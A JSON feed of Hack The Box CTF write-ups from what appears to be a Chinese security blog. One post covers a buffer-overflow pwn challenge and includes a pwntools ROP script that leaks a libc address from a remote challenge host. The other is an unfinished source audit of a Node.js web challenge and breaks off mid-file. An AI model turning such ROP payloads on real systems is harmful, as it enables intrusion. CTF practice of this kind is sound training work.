{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"htb\" category",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/HTB-Restauran/",
            "url": "https://lookhui.github.io/HTB-Restauran/",
            "title": "HTB-Restauran",
            "date_published": "2023-12-18T04:35:55.000Z",
            "content_html": "<h1 id=\"restauran\"><a class=\"anchor\" href=\"#restauran\">#</a> Restauran</h1>\n<p>一直刷渗透多无聊在玩玩 pwn 来感受 pwnpwn 的乐趣</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>没有开 stack 和 pie</p>\n<p>运行看看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🥡 Welcome to Rocky Restaurant 🥡</span><br></pre></td></tr></table></figure></p>\n<p>应该是一个餐厅管理系统</p>\n<p>使用 ida64 进行调试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // ecx</span><br><span class=\"line\">  int v4; // er8</span><br><span class=\"line\">  int v5; // er9</span><br><span class=\"line\">  int v6; // edx</span><br><span class=\"line\">  int v7; // ecx</span><br><span class=\"line\">  int v8; // er8</span><br><span class=\"line\">  int v9; // er9</span><br><span class=\"line\">  __int64 v10; // rdx</span><br><span class=\"line\">  int v11; // ecx</span><br><span class=\"line\">  int v12; // er8</span><br><span class=\"line\">  int v13; // er9</span><br><span class=\"line\">  int v15; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  color((unsigned int)&amp;unk_401250, (unsigned int)&quot;cyan&quot;, (unsigned int)&quot;bold&quot;, v3, v4, v5);</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat would you like?&quot;, (unsigned int)&quot;green&quot;, v6, v7, v8, v9);</span><br><span class=\"line\">  printf(&quot;\\n1. Fill my dish.\\n2. Drink something\\n&gt; &quot;);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v15);</span><br><span class=\"line\">  if ( v15 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fill((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v15 != 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      color((unsigned int)&quot;\\nInvalid option! Exiting..\\n&quot;, (unsigned int)&quot;red&quot;, (unsigned int)&quot;bold&quot;, v11, v12, v13);</span><br><span class=\"line\">      exit(261);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    drink((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个是 main 函数里面的</p>\n<p>fill</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall fill(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v6; // ecx</span><br><span class=\"line\">  int v7; // er8</span><br><span class=\"line\">  int v8; // er9</span><br><span class=\"line\">  __int64 buf; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  color(</span><br><span class=\"line\">    (unsigned int)&quot;\\nYou can add these ingredients to your dish:&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;green&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;bold&quot;,</span><br><span class=\"line\">    a4,</span><br><span class=\"line\">    a5,</span><br><span class=\"line\">    a6,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL);</span><br><span class=\"line\">  puts(::a1);</span><br><span class=\"line\">  color((unsigned int)&quot;You can also order something else.\\n&gt; &quot;, (unsigned int)&quot;green&quot;, (unsigned int)&quot;bold&quot;, v6, v7, v8);</span><br><span class=\"line\">  read(0, &amp;buf, 0x400uLL);</span><br><span class=\"line\">  return printf(&quot;\\nEnjoy your %s&quot;, (const char *)&amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个漏洞点很简单就是 ret2libc 但是我一直打印不出栈地址，很难受</p>\n<p>drink</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall drink(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  const char *v6; // rax</span><br><span class=\"line\">  int v8; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat beverage would you like?&quot;, (unsigned int)&quot;green&quot;, a3, a4, a5, a6);</span><br><span class=\"line\">  printf(a1Water2);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v8);</span><br><span class=\"line\">  if ( v8 == 1 || v8 == 2 )</span><br><span class=\"line\">    v6 = &quot;\\nEnjoy your drink!&quot;;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    v6 = &quot;\\nInvalid option&quot;;</span><br><span class=\"line\">  return puts(v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里的话就是 puts (v6 是需要注意的点)</p>\n<p>写到了这里发现行不通</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">elf=ELF(&quot;./restaurant&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(b&quot;./libc.so.6&quot;)</span><br><span class=\"line\">#p=process(b&quot;./restaurant&quot;)</span><br><span class=\"line\">p=remote(&quot;167.99.85.216&quot;,32579)</span><br><span class=\"line\">puts=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">ret=0x40063e</span><br><span class=\"line\">rdi_pop=0x4010a3</span><br><span class=\"line\">fill=0x400E4A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts)+p64(fill)</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(str(1))</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">#p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)</span><br><span class=\"line\">a=p.recvline()</span><br><span class=\"line\">a+=p.recvline()</span><br><span class=\"line\">d=p.recvline()</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>发现 pwn 原来也这么难有点环境问题就 gg</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "url": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "title": "HTB-TwoDots_Horror",
            "date_published": "2023-12-15T12:23:43.000Z",
            "content_html": "<h1 id=\"twodots-horror未完成\"><a class=\"anchor\" href=\"#twodots-horror未完成\">#</a> TwoDots Horror（未完成）</h1>\n<p>白盒测试</p>\n<p>这个代码是 node.js 写的我们首先查看这个 dockerfile 发现并没有 flag 信息</p>\n<p>审计一下这些 js 代码</p>\n<p>index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const express       = require(&#x27;express&#x27;);</span><br><span class=\"line\">const fileUpload    = require(&#x27;express-fileupload&#x27;);</span><br><span class=\"line\">const app           = express();</span><br><span class=\"line\">const path          = require(&#x27;path&#x27;);</span><br><span class=\"line\">const bodyParser    = require(&#x27;body-parser&#x27;);</span><br><span class=\"line\">const cookieParser  = require(&#x27;cookie-parser&#x27;);</span><br><span class=\"line\">const nunjucks      = require(&#x27;nunjucks&#x27;);</span><br><span class=\"line\">const routes        = require(&#x27;./routes&#x27;);</span><br><span class=\"line\">const Database      = require(&#x27;./database&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">const db = new Database(&#x27;TwoDots-Horror.db&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(bodyParser.json());</span><br><span class=\"line\">app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</span><br><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(fileUpload(&#123; limits: &#123;</span><br><span class=\"line\">\t\tfileSize: 2 * 1024 * 1024 // 2 MB</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\tabortOnLimit: true</span><br><span class=\"line\"> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(function(req, res, next) &#123;</span><br><span class=\"line\">\tres.setHeader(&quot;Content-Security-Policy&quot;, &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;)</span><br><span class=\"line\">\tnext();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">nunjucks.configure(&#x27;views&#x27;, &#123;</span><br><span class=\"line\">\tautoescape: true,</span><br><span class=\"line\">\texpress: app</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(&#x27;views&#x27;, &#x27;./views&#x27;);</span><br><span class=\"line\">app.use(&#x27;/static&#x27;, express.static(path.resolve(&#x27;static&#x27;)));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(routes(db));</span><br><span class=\"line\"></span><br><span class=\"line\">app.all(&#x27;*&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.status(404).send(&#123;</span><br><span class=\"line\">\t\tmessage: &#x27;404 page not found&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">(async () =&gt; &#123;</span><br><span class=\"line\">\tawait db.connect();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">\tapp.listen(1337, &#x27;0.0.0.0&#x27;, () =&gt; console.log(&#x27;Listening on port 1337&#x27;));</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n<p>database.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const sqlite = require(&#x27;sqlite-async&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">class Database &#123;</span><br><span class=\"line\">\tconstructor(db_file) &#123;</span><br><span class=\"line\">\t\tthis.db_file = db_file;</span><br><span class=\"line\">\t\tthis.db = undefined;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tasync connect() &#123;</span><br><span class=\"line\">\t\tthis.db = await sqlite.open(this.db_file);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync migrate() &#123;</span><br><span class=\"line\">\t\treturn this.db.exec(`</span><br><span class=\"line\">            DROP TABLE IF EXISTS users;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS users (</span><br><span class=\"line\">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                username   VARCHAR(255) NOT NULL UNIQUE,</span><br><span class=\"line\">                password   VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                avatar     VARCHAR(255) NOT NULL</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            DROP TABLE IF EXISTS posts;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS posts (</span><br><span class=\"line\">                id         INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                author  VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                content    VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                approved   INTEGER      NOT NULL,</span><br><span class=\"line\">                created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;ColonelAengus&#x27;, 1, &#x27;Our baby girl is finally crawling for the first time. I just wish it wasn’t on the ceiling.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;windowsXP&#x27;, 1, &#x27;Keyboard not responding. Press any key to continue.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;unkn0wn&#x27;, 1, &#x27;There was a picture in my phone of me sleeping. I live alone.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;Scry67&#x27;, 1, &#x27;The last man on Earth sat alone in a room. There was a knock at the door.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;fluffyponyza&#x27;, 1, &#x27;Day 312. Internet still not working.&#x27;);</span><br><span class=\"line\">        `);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync registerUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO users (username, password, avatar) VALUES ( ?, ?, &quot;default.jpg&quot;)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve((await stmt.run(user, pass)));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync loginUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user, pass));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync checkUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tlet row = await stmt.get(user);</span><br><span class=\"line\">\t\t\t\tresolve(row !== undefined);</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync updateAvatar(user, avatar) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;UPDATE users SET avatar = ? WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(avatar, user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync addPost(author, content) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO posts (author, content, approved) VALUES (? , ?, 0)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(author, content));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getPosts(approved=1) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM posts WHERE approved = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.all(approved));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = Database;</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库语法使用了预处理无法造成常规 sql 注入</p>\n<p>bot.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const puppeteer = require(&#x27;puppeteer&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">const browser_options = &#123;</span><br><span class=\"line\">\theadless: true,</span><br><span class=\"line\">\targs: [</span><br><span class=\"line\">\t\t&#x27;--no-sandbox&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-background-networking&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-default-apps&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-extensions&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-gpu&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-sync&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-translate&#x27;,</span><br><span class=\"line\">\t\t&#x27;--hide-scrollbars&#x27;,</span><br><span class=\"line\">\t\t&#x27;--metrics-recording-only&#x27;,</span><br><span class=\"line\">\t\t&#x27;--mute-audio&#x27;,</span><br><span class=\"line\">\t\t&#x27;--no-first-run&#x27;,</span><br><span class=\"line\">\t\t&#x27;--safebrowsing-disable-auto-update&#x27;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">const cookies = [&#123;</span><br><span class=\"line\">    &#x27;name&#x27;: &#x27;flag&#x27;,</span><br><span class=\"line\">    &#x27;value&#x27;: &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\">async function purgeData(db)&#123;</span><br><span class=\"line\">\tconst browser = await puppeteer.launch(browser_options);</span><br><span class=\"line\">\tconst page 